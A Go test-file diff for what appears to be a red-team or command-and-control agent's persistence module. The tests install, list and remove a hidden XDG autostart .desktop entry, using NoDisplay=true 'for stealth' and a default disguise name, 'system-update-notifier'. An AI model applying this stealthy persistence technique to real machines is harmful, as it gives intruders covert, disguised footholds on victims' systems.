@@ -329,6 +329,168 @@ func TestPersistLinux_SSHKeyPreservesExisting(t *testing.T) {
 	})
 }
 
+func TestPersistLinux_XDGAutostartInstallAndRemove(t *testing.T) {
+	withTempHome(t, func(tmpHome string) {
+		// Install XDG autostart entry
+		result := persistXDGAutostartInstall(persistArgs{
+			Path: "/tmp/test-agent",
+			Name: "my-service",
+		})
+		if result.Status != "success" {
+			t.Fatalf("install failed: %s", result.Output)
+		}
+
+		// Verify .desktop file
+		desktopFile := filepath.Join(tmpHome, ".config", "autostart", "my-service.desktop")
+		data, err := os.ReadFile(desktopFile)
+		if err != nil {
+			t.Fatalf(".desktop file not created: %v", err)
+		}
+		content := string(data)
+		if !strings.Contains(content, "[Desktop Entry]") {
+			t.Error("should contain [Desktop Entry] section")
+		}
+		if !strings.Contains(content, "Exec=/tmp/test-agent") {
+			t.Error("should contain Exec path")
+		}
+		if !strings.Contains(content, "NoDisplay=true") {
+			t.Error("should have NoDisplay=true for stealth")
+		}
+		if !strings.Contains(content, "X-GNOME-Autostart-enabled=true") {
+			t.Error("should have GNOME autostart enabled")
+		}
+
+		// Duplicate install should fail
+		result2 := persistXDGAutostartInstall(persistArgs{
+			Path: "/tmp/test-agent",
+			Name: "my-service",
+		})
+		if result2.Status != "error" {
+			t.Error("duplicate install should fail")
+		}
+
+		// Remove
+		result3 := persistXDGAutostartRemove(persistArgs{Name: "my-service"})
+		if result3.Status != "success" {
+			t.Fatalf("remove failed: %s", result3.Output)
+		}
+
+		// Verify removed
+		if _, err := os.Stat(desktopFile); err == nil {
+			t.Error(".desktop file should be removed")
+		}
+	})
+}
+
+func TestPersistLinux_XDGAutostartDefaultName(t *testing.T) {
+	withTempHome(t, func(tmpHome string) {
+		result := persistXDGAutostartInstall(persistArgs{
+			Path: "/tmp/agent",
+		})
+		if result.Status != "success" {
+			t.Fatalf("install failed: %s", result.Output)
+		}
+
+		// Should use default name
+		desktopFile := filepath.Join(tmpHome, ".config", "autostart", "system-update-notifier.desktop")
+		if _, err := os.Stat(desktopFile); err != nil {
+			t.Error("should create file with default name")
+		}
+
+		// Cleanup
+		persistXDGAutostartRemove(persistArgs{})
+	})
+}
+
+func TestPersistLinux_XDGAutostartMissingPath(t *testing.T) {
+	result := persistXDGAutostartInstall(persistArgs{})
+	if result.Status != "error" {
+		t.Error("should fail without path")
+	}
+}
+
+func TestPersistLinux_XDGAutostartRemoveNonexistent(t *testing.T) {
+	withTempHome(t, func(tmpHome string) {
+		result := persistXDGAutostartRemove(persistArgs{Name: "nonexistent"})
+		if result.Status != "error" {
+			t.Error("should fail for nonexistent entry")
+		}
+	})
+}
+
+func TestPersistLinux_XDGAutostartUnknownAction(t *testing.T) {
+	result := persistXDGAutostart(persistArgs{Action: "invalid"})
+	if result.Status != "error" {
+		t.Error("should fail for unknown action")
+	}
+}
+
+func TestPersistLinux_XDGAutostartDisplayName(t *testing.T) {
+	withTempHome(t, func(tmpHome string) {
+		result := persistXDGAutostartInstall(persistArgs{
+			Path: "/tmp/agent",
+			Name: "my-cool-service",
+		})
+		if result.Status != "success" {
+			t.Fatalf("install failed: %s", result.Output)
+		}
+
+		desktopFile := filepath.Join(tmpHome, ".config", "autostart", "my-cool-service.desktop")
+		data, _ := os.ReadFile(desktopFile)
+		// Hyphenated name should be title-cased
+		if !strings.Contains(string(data), "Name=My Cool Service") {
+			t.Errorf("display name should be title-cased, got: %s", string(data))
+		}
+
+		persistXDGAutostartRemove(persistArgs{Name: "my-cool-service"})
+	})
+}
+
+func TestPersistLinux_XDGAutostartViaCommand(t *testing.T) {
+	withTempHome(t, func(tmpHome string) {
+		cmd := &PersistCommand{}
+		params, _ := json.Marshal(persistArgs{
+			Method: "xdg-autostart",
+			Action: "install",
+			Path:   "/tmp/agent",
+			Name:   "cmd-test",
+		})
+		task := structs.NewTask("t", "persist", "")
+		task.Params = string(params)
+		result := cmd.Execute(task)
+		if result.Status != "success" {
+			t.Fatalf("execute failed: %s", result.Output)
+		}
+		if !strings.Contains(result.Output, "XDG autostart") {
+			t.Error("output should mention XDG autostart")
+		}
+
+		// Cleanup
+		persistXDGAutostartRemove(persistArgs{Name: "cmd-test"})
+	})
+}
+
+func TestPersistLinux_XDGAutostartInList(t *testing.T) {
+	withTempHome(t, func(tmpHome string) {
+		// Install an autostart entry
+		persistXDGAutostartInstall(persistArgs{
+			Path: "/tmp/agent",
+			Name: "list-test",
+		})
+
+		result := persistLinuxList()
+		if !strings.Contains(result.Output, "[XDG Autostart]") {
+			t.Error("list should contain XDG Autostart section")
+		}
+		if !strings.Contains(result.Output, "list-test.desktop") {
+			t.Error("list should show installed .desktop file")
+		}
+
+		// Cleanup
+		persistXDGAutostartRemove(persistArgs{Name: "list-test"})
+	})
+}
+
 func TestPersistLinux_SystemdDefaultName(t *testing.T) {
 	// Just test that the default name logic works (will fail at filesystem level)
 	result := persistSystemdInstall(persistArgs{Path: "/tmp/agent"})
